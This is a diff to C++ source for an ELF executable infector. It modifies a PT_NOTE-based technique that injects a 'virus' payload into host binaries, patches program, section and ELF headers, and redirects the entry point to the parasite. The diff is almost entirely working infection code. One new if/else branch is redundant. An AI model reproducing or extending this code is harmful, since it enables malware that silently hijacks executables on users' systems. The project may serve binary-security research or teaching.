@@ -53,7 +53,11 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
 
 void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr parasite_load_address,
                 uint64_t virus_offset) {
-  ehdr.e_entry = parasite_load_address;
+  if (ehdr.e_type == ET_EXEC) {
+    ehdr.e_entry = parasite_load_address;
+  } else {
+    ehdr.e_entry = parasite_load_address;
+  }
 }
 
 }  // namespace
@@ -87,6 +91,8 @@ bool PtNoteInfect::analyze(std::span<const std::byte> host_mapping,
                                        phdr_entry->p_align));
       // copy alignment so later we can assign to PT_NOTE.
       pt_load_alignment_ = phdr_entry->p_align;
+      virus_offset_ =
+          common::round_up_to(host_mapping.size(), pt_load_alignment_);
     } else if (phdr_entry->p_type == PT_NOTE) {
       // We found the last PT_NOTE section that can be infected, because
       // GNU_PROPERTY (for example on x86-64) might overlap with the first. On
@@ -139,12 +145,10 @@ bool PtNoteInfect::inject(std::span<std::byte> host_mapping,
 
   const auto virus_size = parasite_mapping.size();
 
-  // In order to make it work on PIEs, these two must be the same.
-  const auto virus_offset = parasite_load_address_;
   {
     auto& mutable_phdr =
         reinterpret_cast<Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
-    patch_phdr(mutable_phdr, virus_size, virus_offset,
+    patch_phdr(mutable_phdr, virus_size, virus_offset_,
                pt_note_to_be_infected_idx_, pt_load_alignment_,
                parasite_load_address_);
   }
@@ -154,7 +158,7 @@ bool PtNoteInfect::inject(std::span<std::byte> host_mapping,
     // stripped.
     auto& mutable_shdr =
         reinterpret_cast<Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
-    if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset,
+    if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset_,
                    original_pt_note_file_offset_, parasite_load_address_)) {
       return false;
     }
@@ -162,15 +166,15 @@ bool PtNoteInfect::inject(std::span<std::byte> host_mapping,
 
   {
     auto& mutable_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
-    patch_ehdr(mutable_ehdr, parasite_load_address_, virus_offset);
+    patch_ehdr(mutable_ehdr, parasite_load_address_, virus_offset_);
   }
 
   // Inject the virus.
-  vt::memcpy(&host_mapping[virus_offset], &parasite_mapping.front(),
+  vt::memcpy(&host_mapping[virus_offset_], &parasite_mapping.front(),
              parasite_mapping.size());
 
   return common::redirect_elf_entry_point(
-      ehdr.e_type, original_e_entry_, parasite_load_address_, virus_offset,
+      ehdr.e_type, original_e_entry_, parasite_load_address_, virus_offset_,
       parasite_mapping.size(), host_mapping);
 }
 
@@ -181,7 +185,7 @@ size_t PtNoteInfect::injected_host_size() {
   // simple. The size effect is that the executable would be very big, if the
   // victim happens to use a custom linker script that points segments at a very
   // large starting vaddr.
-  return parasite_load_address_ + parasite_size_;
+  return virus_offset_ + parasite_size_;
 }
 
 }  // namespace vt::infector
